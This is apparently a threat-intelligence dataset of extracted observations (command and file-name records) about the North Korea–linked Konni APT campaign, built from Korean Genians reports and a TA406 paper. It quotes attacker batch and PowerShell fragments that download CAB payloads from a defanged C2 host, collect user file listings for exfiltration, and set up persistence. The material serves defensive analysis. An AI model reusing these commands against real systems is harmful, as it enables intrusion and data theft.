1.0.0,actor--konni,artifact--sha256:65743e0cccab44b22151de362a28d1c2a1bc32b558ea48d73500a1cd7c0f989c,observation--sha256:77e91390f5916de2d831ce35f1cfb980b4d0db08f20427608d538190027a9858,command,○'install.vbs' 파일은'stopedge.bat' 배치파일의내부명령조건(' paycom.ini' 파일존재의경우)에따라작업스케줄러( Schtasks) 로등록된후호출되는과정을거칩니다.,○'install.vbs' 파일은'stopedge.bat' 배치파일의내부명령조건(' paycom.ini' 파일존재의경우)에따라작업스케줄러( Schtasks) 로등록된후호출되는과정을거칩니다,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○ 주요 문자열은 10진수 값으로 선언되어 있고, XOR 로직을 통해 ASCII 문자로변환되는과정을거치게됩니다. [그림4-1] 'update.vbs' XOR연산부분을ASCII 문자로치환한화면 ○ 25개의 연산 항목을 문자열로 변경하면 다음과 같이 Windows Script Host(WScript.Shell) 를사용하여'stopedge.bat' 배치파일을호출하여실행하는것을알수있습니다. ■'install.vbs' 파일코드분석 ○'install.vbs' 파일은'stopedge.bat' 배치파일의내부명령조건(' paycom.ini' 파일존재의경우)에따라작업스케줄러( Schtasks) 로등록된후호출되는과정을거칩니다. Genians SecurityCenter 19",
1.0.0,actor--konni,artifact--sha256:dec93e2267ce5d870f6f840687367ae2c438459d9a336ef5bd31541edecfbd87,observation--sha256:6fb3d1c951ce6f57287610d5de2e0207c604dd1a398833cca76f727ec5fa1e56,command,데이터를 블럭화해 Powershell 명령을 수행합니다. 미끼로 보여줄 정상 (문서) 파일 후위에,데이터를 블럭화해 Powershell 명령을 수행합니다. 미끼로 보여줄 정상 (문서) 파일 후위에,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 5 d. 공격 전술 및 기술, 절차 (TTPs) & 킬 스위치 ○ 공격자는 다양한 실전 경험을 통해 효과적인 위협 시나리오를 기획하고, 거점용 C2(명령제어) 서버를 구축해 본격적인 공격을 준비합니다. 그리고 공격 대상자를 선정 후 현혹될 만한 주제의 내용과 악성 파일을 개발해 스피어 피싱 공격을 수행했습니다. ○ LNK 바로가기 타입의 공격은 국내에서 다수 보고되고 있습니다. 특히, APT37 그룹은 자동화된 악성코드 제작도구까지 도입해 활용하는 등 나름 적극적으로 사용 중인데, 코니 그룹이 사용한 코드와는 기술적으로 일부 상이한 구조를 보입니다. ○ APT37 그룹과 다르게 코니 그룹이 사용한 LNK 파일은 포맷 내부에 16 진수 스트링 데이터를 블럭화해 Powershell 명령을 수행합니다. 미끼로 보여줄 정상 (문서) 파일 후위에 악성 ZIP 또는 CAB 압축 포맷이 연이어 내장돼 있는",
1.0.0,actor--konni,artifact--sha256:1375638c11b8b4aa509559886233bd419dae0be961cf529b4d224b4f1a74d389,observation--sha256:dda13449a909782a1b381c3b6275f6572a6d1a22d679f9850ae3815c4d2d80c0,command,사용된 Powershell 코드를 자세히 파악할 수 있습니다.,사용된 Powershell 코드를 자세히 파악할 수 있습니다,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Threat Intelligence Report Genians Security Center 13 ○ LNK Parser 5 도구를 통해 내부 환경변수 위치에 선언된 ‘cmd.exe’ 명령과 인자값으로 사용된 Powershell 코드를 자세히 파악할 수 있습니다. [그림 08] LNK 내부 데이터 추출 화면 5 LNK Parser,
1.0.0,actor--konni,artifact--sha256:a7b9a74ecab1914b9e09a0efb6e815ab5b3dd2a66791a0868897f3dbaae87eb5,observation--sha256:6a525fb5193dc0dbd26d9283ab3149eebca5a57b688d66456f9204175372bbb7,command,암호화를 해제하는 Key 값으로 앞서 설명한 [Powershell (Get-Date).ticks] 내용입니다.,암호화를 해제하는 Key 값으로 앞서 설명한 [Powershell (Get-Date).ticks] 내용입니다,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 26}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 25 ○ (goto 1) 루틴으로 점프하면, 가장 먼저 ‘temprun.bat’ 파일이 있는지 비교하고 존재할 경우 삭제를 진행합니다. 그리고 call 배치 명령을 통해 ‘19288086.bat’ 파일을 호출합니다. call 19288086.bat ""http://overseeby[.]com/list.php?f=%COMPUTERNAME%.txt"" ""%~dp0IxOkj.cab"" ""1""> nul expand IxOkj.cab -F:* %~dp0 > nul del /f /q IxOkj.cab > nul call temprun.bat > nul [표 09] C2 호스트에서 압축파일 다운로드 및 실행 과정 화면 ○ C2(overseeby [.]com) 명령을 통해 감염된 컴퓨터명의 파일이 서버에 존재할 경우 ‘IxOkj.cab’ 이름으로 다운로드하고 ‘expand’ 명령을 통해 압축을 풀고 삭제합니다. ",
1.0.0,actor--konni,artifact--sha256:2b86d1bacc983fad748a85a77394c4b517cd1240aa4d56c19afeee0779cd096f,observation--sha256:c506f52babeecc15125778be6374bc457241ef0782981ea12646d2621e194d10,command,주요 기능을 종료합니다. 만약 다운로드된 ‘85214.zip’ 파일이 존재할 경우 Powershell,주요 기능을 종료합니다. 만약 다운로드된 ‘85214.zip’ 파일이 존재할 경우 Powershell,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 29}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 28 ○ 조건 분기에 따라 ‘85214.zip’ 파일이 존재하지 않으면, (goto END1) 루틴으로 이동해 주요 기능을 종료합니다. 만약 다운로드된 ‘85214.zip’ 파일이 존재할 경우 Powershell 명령으로 압축 파일을 확인하고, ‘unzip.exe’ 파일을 통해 미리 설정된 암호화 압축을 해제합니다. 그 다음 ‘rundll32.exe’ 파일로 추가 실행을 하는데, 해당 파일은 DLL 유형의 RAT 또는 Bot 형태일 가능성이 있습니다. [그림 22] 32981202.bat 에 의해 실행된 공격 스토리라인 [그림 23] 32981202.bat 에 의해 실행된 이벤트의 타임라인",
1.0.0,actor--konni,artifact--sha256:133732f2c82114ac11bdbfa1740063a41191b1c9205b179651250c0c5da7edf8,observation--sha256:ac53b57627dd56ac48dcd8a62a9a8bdb6fb6fd580d343bcd3abcee9fad1a9957,command,"컴퓨터의 주요 정보를 수집해 유출을 시도하고, 순차적 다단계 (VBS, BAT, Powershell)","컴퓨터의 주요 정보를 수집해 유출을 시도하고, 순차적 다단계 (VBS, BAT, Powershell",candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 3 b. 악성 파일 동작 흐름도 (Malware Flowchart) ○ 세금 관련 이슈는 기업 관계자로서 매우 민감한 소재 중 하나로 실제 공격을 받은 대상자는 대북분야 기업의 대표입니다. 수신자로 하여금 불안 심리를 증폭시켜, 첨부 파일에 대한 접근을 보다 빠르게 만들기 위한 위협 전략으로 관측됩니다. 이메일에는 ‘소명자료 제출요청 안내.zip’ 이름의 압축 파일이 첨부돼 있으며, 압축 파일 내부에는 2 개의 HWP 문서 파일과 1 개의 LNK 바로가기 파일이 포함돼 있습니다. LNK 파일명은 ‘소명자료 목록(국세징수법 시행규칙).hwp.lnk’ 입니다. ○ ‘ 소명자료 목록(국세징수법 시행규칙).hwp.lnk’ 바로가기 파일이 실행되면 피해자 컴퓨터의 주요 정보를 수집해 유출을 시도하고, 순차적 다단계 (VBS, BAT, Powershell) 명령을 통해 추가 악성 파일 설치 등 잠재적 위",
1.0.0,actor--konni,artifact--sha256:42d9e2ff1ab97106469b615dbfcfa7b94894aa0645a952bafd25695924bb35fd,observation--sha256:5ab5dc3284fcc53449e796a5e99b80481cea62f1c7acbbe1b4e55fc94889a978,command,"코드는 Powershell 인자 값을 사용하는 것은 동일하지만, Base64 데이터로 인코딩된 값을","코드는 Powershell 인자 값을 사용하는 것은 동일하지만, Base64 데이터로 인코딩된 값을",candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 38}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 37 b. APT37 와 Konni LNK 공격 차이점 ○ APT37 에서 사용된 LNK 악성 코드는 Powershell 인자 값을 사용해 내부에 삽입한 정상 문서(HWP, PDF 등)와 악성 BAT 파일의 위치를 지정해 사용합니다. 반면, Konni LNK 악성 코드는 Powershell 인자 값을 사용하는 것은 동일하지만, Base64 데이터로 인코딩된 값을 먼저 사용합니다. ○ Base64 인코딩된 값을 디코딩해 비교해 보면 일부 유사한 패턴을 가지고 있지만, APT37 의 경우 정상과 악성 파일이 그대로 내부에 삽입된 형태를 가진다면, Konni 의 경우 CAB 또는 ZIP 압축 형태를 포함한 점이 서로 다릅니다. 따라서, Konni LNK 경우 압축을 해제하는 설정 값들이 추가로 존재합니다. APT37 LNK Konni LNK -Recurse *.lnk ^| where-object {",
1.0.0,actor--konni,artifact--sha256:d0eb4418154035402e645c1a1e1a75be46737121c6b2ac05210e7aac8a54bd92,observation--sha256:f93da26bcbba10721b8e2fcabd7c6a55c9a03d68c98eb2e38e546b20b37ab82f,command,"해제합니다. 그 다음 ‘rundll32.exe’ 파일로 추가 실행을 하는데, 해당 파일은 DLL 유형의","해제합니다. 그 다음 ‘rundll32.exe’ 파일로 추가 실행을 하는데, 해당 파일은 DLL 유형의",candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 29}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 28 ○ 조건 분기에 따라 ‘85214.zip’ 파일이 존재하지 않으면, (goto END1) 루틴으로 이동해 주요 기능을 종료합니다. 만약 다운로드된 ‘85214.zip’ 파일이 존재할 경우 Powershell 명령으로 압축 파일을 확인하고, ‘unzip.exe’ 파일을 통해 미리 설정된 암호화 압축을 해제합니다. 그 다음 ‘rundll32.exe’ 파일로 추가 실행을 하는데, 해당 파일은 DLL 유형의 RAT 또는 Bot 형태일 가능성이 있습니다. [그림 22] 32981202.bat 에 의해 실행된 공격 스토리라인 [그림 23] 32981202.bat 에 의해 실행된 이벤트의 타임라인",
1.0.0,actor--konni,artifact--sha256:dca23757e9171441f67a8f9e4aa21d95de398261c10db4c39c52b7e9db45b1c8,observation--sha256:5dcf22072e01e64e48f5b630a96ca3e91c55df98dd1fb0c1e2fff060bf1cebbd,file-name,-32981202.bat,-32981202.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 36}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 국세청사칭- 30966118.bat 북한인권단체사칭- resolvedns.bat call unzip.exe-P""a""""%~dp0%fn%.zip"" >nuldel /f /q%~dp0%fn%.zip>nul call unzip.exe-P""a"" -o""%~dp0%ttn%.zip"" >nuldel /f /q%~dp0%ttn%.zip>nul[표5-3] unzip.exe실행명령어부분비교화면 ○ 컴퓨터 내부 정보를 수집하는 명령을 비교해 보면, 확장자가 txt 파일에서 data이름으로 변경된 것 외에 64비트 OS 기반 프로그램 파일 경로가추가된것을알수있습니다. 국세청사칭-32981202.bat 북한인권단체사칭-versioninfo.bat [표5-4] 정보수집및유출명령부분비교화면 Genians SecurityCenter 35",
1.0.0,actor--konni,artifact--sha256:f86aab46f2c037ee9d346002f93bf9627a53d54f204ea43cd0507bb2c8ce94f5,observation--sha256:e059cfa224d99f58df3325b5c2986ca3698f95c0b26e9bf9734e712a5772cf40,file-name,-versioninfo.bat,-versioninfo.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 36}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 국세청사칭- 30966118.bat 북한인권단체사칭- resolvedns.bat call unzip.exe-P""a""""%~dp0%fn%.zip"" >nuldel /f /q%~dp0%fn%.zip>nul call unzip.exe-P""a"" -o""%~dp0%ttn%.zip"" >nuldel /f /q%~dp0%ttn%.zip>nul[표5-3] unzip.exe실행명령어부분비교화면 ○ 컴퓨터 내부 정보를 수집하는 명령을 비교해 보면, 확장자가 txt 파일에서 data이름으로 변경된 것 외에 64비트 OS 기반 프로그램 파일 경로가추가된것을알수있습니다. 국세청사칭-32981202.bat 북한인권단체사칭-versioninfo.bat [표5-4] 정보수집및유출명령부분비교화면 Genians SecurityCenter 35",
1.0.0,actor--konni,artifact--sha256:a1a3a13801a56bb687724d736a7f1af4098d239d2dc8e9ecfce3f5bbae1ec019,observation--sha256:d239cc0aeb6df07780a1180a029eadbf82a617f435b15768278798d583593156,file-name,04769.zip,04769.zip,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 15 ○ 내부에 선언된 인자값은 LNK 전체 길이 ‘0x1466956A’ (342,267,242 바이트) 값을 확인합니다. 그리고 ‘0x00003C4A’ 오프셋 부터 ‘0x00006C00’ 값을 읽어 유니코드 이스케이프 포맷 6에 선언한 ‘소명자료 목록(국세징수법 시행규칙).hwp’ 파일로 생성 후 실행합니다. 그리고 기존 LNK 파일은 삭제됩니다. Unicode Escape Unicode Unescape \uC18C\uBA85\uC790\uB8CC \u0020\uBAA9\uB85D\u0028 \uAD6D\uC138\uC9D5\uC218 \uBC95\u0020\uC2DC\uD589 \uADDC\uCE59\u0029\u002E \u0068\u0077\u0070 소명자료 목록(국세징수법 시행규칙).hwp [표 03] 유니코드 문자 변환 화면 ○ 다음으로 ‘0x0000A84A’ 오프셋 부터 ‘0x0",
1.0.0,actor--konni,artifact--sha256:a1a3a13801a56bb687724d736a7f1af4098d239d2dc8e9ecfce3f5bbae1ec019,observation--sha256:746b2c55587dbb45b31789dfdab329edb3ff0b36a815b9c3a19e3460f0397353,file-name,04769.zip,04769.zip,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 18}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 17 ○ ‘04769.zip’ 파일은 공용 문서 폴더 경로에 압축을 해제하는데, 총 7 개의 파일을 포함하고 있습니다. [그림 09] LNK 내부 데이터 추출 화면 ○ 각 스크립트와 배치파일은 상호 연동하여 작동하는데, 기본적으로 컴퓨터 내 주요 파일 목록과 시스템 정보, 공인 아이피 주소, 실행 프로세스 상태를 수집하고 저장하는 정찰활동을 수행합니다. 그리고 RC4 알고리즘으로 암호화하고, Base64 인코딩을 거친 후 명령제어(C2) 서버로 수집된 자료를 은밀히 전송합니다. ○ 공격자는 1 차 수집된 피해자 정보 기반으로 후속 공격 대상 컴퓨터를 선별합니다. 따라서 샌드박스(SandBox)나 위협 분석가의 가상(VMware) 환경에는 추가 악성 파일을 설치하지 않아, 최종 페이로드(Payload) 모듈 확보가 제한적 입니다. 다만, 과거 유사 피해 사례에서 RAT/Bot 계열의 악성 파일이",
1.0.0,actor--konni,artifact--sha256:a1a3a13801a56bb687724d736a7f1af4098d239d2dc8e9ecfce3f5bbae1ec019,observation--sha256:7ed6cc4a3707c130facb8552f8825e6266723a86277f3bd8095edc149400f990,file-name,04769.zip,04769.zip,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 20 ○ 한편, 초기에 악성 LNK 파일이 실행되고, ‘04769.zip’ 파일과 함께 생성된 정상 ‘소명자료 목록(국세징수법 시행규칙).hwp’ 파일은 다음과 같이 보여집니다. [그림 10] LNK 내부에 포함돼 있던 정상 문서 파일 화면",
1.0.0,actor--konni,artifact--sha256:a1a3a13801a56bb687724d736a7f1af4098d239d2dc8e9ecfce3f5bbae1ec019,observation--sha256:0367ed3bfd150ee827b1a1a9b0818e8ddc4ca503c1c2a6a56c375d7d1471ba4c,file-name,04769.zip,04769.zip,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 6 e. EDR 솔루션을 통한 가시성 확보 (Visibility) ○ 본 사례의 경우 악성 LNK 바로가기 파일 구조 내부에 ‘자금출처명세서(부가가치세법 시행규칙).hwp’ 정상 문서와 ‘04769.zip’ 파일이 임베디드 된 형태로 보관되어 있습니다. 정상 문서 파일은 LNK 파일이 실행된 경로에 만들어지고, 압축 파일은 ‘Public’ 공용 폴더 경로에 생성됩니다. 압축은 공용 경로 하위의 ‘Documents’ 공용 문서 경로에 풀리고, ‘start.vbs’ 파일이 실행되는 과정을 거치게 됩니다. ○ ‘04769.zip’ 파일 내부에는 총 5 개의 BAT 파일이 존재하고, ‘start.vbs’ 파일에 의해 맨 처음 호출되며, 배치 파일 내부명령에 따라 순차적으로 악성 행위를 수행하게 됩니다. 물론 변형에 따라 복잡도는 조금씩 차이가 발생합니다. Genian EDR 3 제품은 이처럼 복잡성을",
1.0.0,actor--konni,artifact--sha256:a1a3a13801a56bb687724d736a7f1af4098d239d2dc8e9ecfce3f5bbae1ec019,observation--sha256:4c370b2e7163cfe5b34d002cc96733472a2d57d8daf5dd1c83fb991c8282438b,file-name,04769.zip,04769.zip,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 34}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 5. 유사도분석(SimilarityAnalysis)5.1. Konni APT캠페인별코드비교■'국세청사칭' VS'북한인권단체사칭' ○ 각 LNK 파일의 내부 명령을 비교해 보면다음과같습니다. 국세청사칭의경우는2023년 7월 31일 지니언스 블로그에 등록된 '국세청 우편물 발송 알림 사칭 공격(Konni APT Campaign)' 위협분석보고서를통해자세한내용을확인할수있습니다.5 ○ 국세청 사칭 LNK 명령어는 16진수 값으로 포함돼 있어, 이 부분은 디코딩 후에비교하였습니다. 국세청사칭LNK명령부분 북한인권단체사칭LNK명령부분 New-Object byte[]0x00014405;$znUKtljyzBrPLDZ.Read($SppylSfzYpca, 0,0x00014405);$znUKtljyzBrPLDZ.Close();Remove-Item-Path$SEvhgMDD-Force;$wxJAARinisLXUr=$env:public+'\' +'04769.zi",
1.0.0,actor--konni,artifact--sha256:541b78f65610bc1cad93ebc7c04e801d3f77a1dff9426e7ea92bb0be91307834,observation--sha256:fe7df49372cc1aebebf54d40627690454f36db53b0a03a3328d5ac5028a4079b,file-name,07856126.bat,07856126.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 18 ○ ‘start.vbs’ 파일은 레지스트리에 등록돼 컴퓨터가 부팅될 때마다 작동하며, 단계별 배치 파일 실행 역할을 수행합니다. 07856126.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로 Key 값은 ‘(Get-Date).Ticks.ToString()’ 문자로 사용 a. ‘32981202.bat’ 파일이 업로드시 사용 - C2 로 정보 업로드 후 ‘upok.txt’ 생성 19288086.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로 Key 값은 ‘(Get-Date).Ticks.ToString()’ 문자로 사용 a. ‘30966118.bat’ 파일이 다운로드시 사용 b. ‘73888454.bat’ 파일이 다운로드시 사용 30966118.bat - ‘19288086.bat’ 루틴을 이용해 C2(naver.cloudfile",
1.0.0,actor--konni,artifact--sha256:541b78f65610bc1cad93ebc7c04e801d3f77a1dff9426e7ea92bb0be91307834,observation--sha256:27cf2f39b098e636d0c6e8833827167da3c0edff6df3b4b40304ab017faf7bdd,file-name,07856126.bat,07856126.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 2}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 1 - 목차 (CONTENTS) – 01. 개요 (Overview) ................................................................................................ 2 a. 금융 및 기밀정보 위협 식별 (Threat Hunting) .................................................. 2 b. 악성 파일 동작 흐름도 (Malware Flowchart) .................................................... 3 c. Konni 배경 (Background) .............................................................................. 4 d. 공격 전술 및 기술, 절차 (TTPs) &",
1.0.0,actor--konni,artifact--sha256:541b78f65610bc1cad93ebc7c04e801d3f77a1dff9426e7ea92bb0be91307834,observation--sha256:2525e5b749a144921fc4ea650152d6bfae7e70e43f443b823d4cbb2439236564,file-name,07856126.bat,07856126.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 32}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 31 명령어 기능 설명 dir C:\Users\%username%\downloa ds\ /s > %~dp0cuserdown.txt ‘downloads’ 경로의 (다운로드)파일 및 폴더 목록 정보를 ‘cuserdown.txt’ 파일로 저장 dir C:\Users\%username%\docume nts\ /s > %~dp0cuserdocu.txt ‘documents’ 경로의 (문서)파일 및 폴더 목록 정보를 ‘cuserdocu.txt’ 파일로 저장 dir C:\Users\%username%\desktop \ /s > %~dp0cuserdesk.txt ‘desktop’ 경로의 (바탕화면)파일 및 폴더 목록 정보를 ‘cuserdesk.txt’ 파일로 저장 dir ""C:\Program Files\"" /s > %~dp0cprog.txt ‘Program Files’ 경로의 (프로그램)파일 및 폴더 목록 정",
1.0.0,actor--konni,artifact--sha256:541b78f65610bc1cad93ebc7c04e801d3f77a1dff9426e7ea92bb0be91307834,observation--sha256:c529bc0176cf58b28a5c482fd29ba79f0b0b55d8ad01a360ef168998cf6446a6,file-name,07856126.bat,07856126.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 35}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 34 g. ‘07856126.bat’ ○ 본 파일도 [RC4+Base64] 암호화 루틴을 가지고 있으며, 사용자 정보를 C2 서버로 유출할 때 암호화하는 용도로 사용이 됩니다. 파일명 07856126.bat MD5 14600ffc77c091a708a8df26b0043a84 SHA1 1953a2a6c8ec43230ae2eb920efe5d85d50b8cf4 SHA256 a9605c875079f350ffe66f2647289c5fea95ce5cdfecebe967 5bc6ed22c77dd7 [표 15] 07856126.bat 파일 HASH 정보 화면 ○ ‘32981202.bat’ 파일이 호출할 때 사용하며, 수집된 각종 정보 텍스트(txt) 파일을 암호화해 업로드할 때 사용되며, fn(filename), fd(filedata), r(rc4 key) 등이 함께 전송되고, 업로드가 완료되면 ‘upok.tx",
1.0.0,actor--konni,artifact--sha256:541b78f65610bc1cad93ebc7c04e801d3f77a1dff9426e7ea92bb0be91307834,observation--sha256:d530531f34c435ca97f060f54cb974598014d47660fab410684a880d29cbf1e9,file-name,07856126.bat,07856126.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 35}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○LNK 바로가기파일에의해Drop 되는ZIP 압축파일은다음과같은구성을가지고있습니다. 국세청사칭ZIP파일구성 북한인권단체사칭ZIP파일구성 start.vbs update.vbs 07856126.bat paycom.ini 19288086.bat resolvedns.bat 30966118.bat stopedge.bat 32981202.bat versioninfo.bat 73888454.bat activate.vbs unzip.exe unactivate.vbs - install.vbs - unzip.exe[표5-2] Konni 캠페인별ZIP파일비교화면 ○국세청사칭의경우'73888454.bat' 파일은'30966118.bat' 파일이존재할경우레지스트리 Run 경로에 'start.vbs' 파일을 등록해 지속성을 유지합니다. 반면,북한인권단체 사칭의 경우 'stopedge.bat' 파일은 'paycom.ini' 파일이존재할경우작업 스케줄러 생성을 통해",
1.0.0,actor--konni,artifact--sha256:ac102ed6969b219f44af7da643fbb3b56b09e558f488a70ba09607e23d5e2f60,observation--sha256:f97aa6254759f66fed84b2aa703974913feef9264c8532d341be181c65a30445,file-name,1.EXE,1.EXE,candidate,,unknown,unknown,not-stated,,source--konni--5b6e99ac261cea7a,konni/konni-threat-insight-paper-triple-threat-N-Korea-aligned-TA406-steals-scams-spies.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"The initial dropper, named mt4managre.exe, used a PDB path of: E:\Work\_Spyware\VIRUS_2020\Release\Dropper_exe_ media.pdb. The dropper can have a variable number of embedded payloads, which is defined by the last four bytes (DWORD) of the file (Figure 44). Figure 44. YoreKey dropper encoded config and number of payloads This value is then multiplied by 76 to find the size of the config. The config precedes the last four bytes of the file. This particular dropper only had two embedded payloads, s",
1.0.0,actor--konni,artifact--sha256:b51758c7ec7c335d19374a8910daa1b8feaeb6bf98ac8757aa331549616b4d40,observation--sha256:060cf31588c10b4bbd3d818efa50af26cb5023c7854db1ff11e796fdfbf39e09,file-name,19288086.bat,19288086.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 18 ○ ‘start.vbs’ 파일은 레지스트리에 등록돼 컴퓨터가 부팅될 때마다 작동하며, 단계별 배치 파일 실행 역할을 수행합니다. 07856126.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로 Key 값은 ‘(Get-Date).Ticks.ToString()’ 문자로 사용 a. ‘32981202.bat’ 파일이 업로드시 사용 - C2 로 정보 업로드 후 ‘upok.txt’ 생성 19288086.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로 Key 값은 ‘(Get-Date).Ticks.ToString()’ 문자로 사용 a. ‘30966118.bat’ 파일이 다운로드시 사용 b. ‘73888454.bat’ 파일이 다운로드시 사용 30966118.bat - ‘19288086.bat’ 루틴을 이용해 C2(naver.cloudfile",
1.0.0,actor--konni,artifact--sha256:b51758c7ec7c335d19374a8910daa1b8feaeb6bf98ac8757aa331549616b4d40,observation--sha256:850c8958037e83c6f685b4e4d9be47afca6a53320d00e548e297b229a122cbe6,file-name,19288086.bat,19288086.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 19 b. fd - Base64+RC4 로 인코딩된 데이터 c. r - RC4 Key 값 [Powershell (Get-Date).ticks]7 73888454.bat - ‘30966118.bat’ 파일 존재 시 : a. 레지스트리 Run 에 ‘svchostno2’ 이름으로 ‘start.vbs’ 등록 b. ‘30966118.bat’ 실행 후 이후 명령에서 삭제 c. ‘32981202.bat’ 실행 - ‘30966118.bat’, ‘upok.txt’ 파일 없을 시 : a. ‘32981202.bat’ 실행 - ‘pakistan.txt’ 파일 없을 시 : a. ‘temprun.bat’ 파일 존재시 삭제 b. ‘19288086.bat’ 파일 루틴을 통해 C2(overseeby[.]com)에서 감염 컴퓨터명 경로 파일을 ‘IxOkj.cab’ 다운로드 후 압축 해제하고 삭제 c. 압축 해제 된 파일 ‘t",
1.0.0,actor--konni,artifact--sha256:b51758c7ec7c335d19374a8910daa1b8feaeb6bf98ac8757aa331549616b4d40,observation--sha256:d97543deb01431c31143c9147ad1bf6a61fdf8ed83f7fa18000a3ce3dd0b9027,file-name,19288086.bat,19288086.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 26}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 25 ○ (goto 1) 루틴으로 점프하면, 가장 먼저 ‘temprun.bat’ 파일이 있는지 비교하고 존재할 경우 삭제를 진행합니다. 그리고 call 배치 명령을 통해 ‘19288086.bat’ 파일을 호출합니다. call 19288086.bat ""http://overseeby[.]com/list.php?f=%COMPUTERNAME%.txt"" ""%~dp0IxOkj.cab"" ""1""> nul expand IxOkj.cab -F:* %~dp0 > nul del /f /q IxOkj.cab > nul call 